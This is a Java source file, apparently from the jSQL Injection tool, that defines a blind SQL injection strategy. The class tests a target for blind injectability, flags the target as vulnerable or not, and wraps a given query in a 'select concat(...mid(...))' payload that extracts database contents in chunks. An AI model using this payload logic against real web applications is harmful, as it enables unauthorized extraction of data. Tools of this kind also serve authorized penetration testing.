package com.jsql.model.pattern.strategy;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.Interruptable;
import com.jsql.model.Stoppable;
import com.jsql.model.bean.Request;
import com.jsql.model.blind.ConcreteBlindInjection;
import com.jsql.view.GUIMediator;

public class BlindStrategy implements IInjectionStrategy {
	
	private ConcreteBlindInjection blind;
//	private BlindInjection blind;
	
	private boolean isApplicable = false;
	
	@Override
	public void checkApplicability() throws PreparationException {
		GUIMediator.model().sendMessage("Blind test...");
		
		blind = new ConcreteBlindInjection();
//		blind = new BlindInjection();
		isApplicable = blind.isInjectable();
//		isApplicable = blind.isBlindInjectable();
		
		if(isApplicable)
			activate();
		else
			deactivate();
	}

	@Override
	public boolean isApplicable() {
        return isApplicable;
	}

	@Override
	public void activate() {
        Request request = new Request();
        request.setMessage("MarkBlindVulnerable");
        GUIMediator.model().interact(request);
	}

	@Override
	public void deactivate() {
        Request request = new Request();
        request.setMessage("MarkBlindInvulnerable");
        GUIMediator.model().interact(request);
	}

	@Override
	public String inject(String sqlQuery, String startPosition, Interruptable interruptable, Stoppable stoppable) throws StoppableException {
		return blind.inject("(" +
                "select+" +
	                "concat(" +
		                "0x53514c69," +
		                "mid(" +
			                "("+sqlQuery+")," +
			                startPosition+"," +
			                "65536" +
		                ")" +
	                ")"+
                ")", interruptable, stoppable);
	}

	@Override
	public void applyStrategy() {
		GUIMediator.model().sendMessage("Using blind injection...");
		GUIMediator.model().applyStrategy(this);
		
		Request request = new Request();
		request.setMessage("MessageBinary");
		request.setParameters("A blind SQL request is true if the diff between a correct page (e.g existing id) and current page is not as the following: "+blind.constantFalseMark+"\n");
		GUIMediator.model().interact(request);
		
		Request request2 = new Request();
        request2.setMessage("MarkBlindStrategy");
        GUIMediator.model().interact(request2);
	}
}
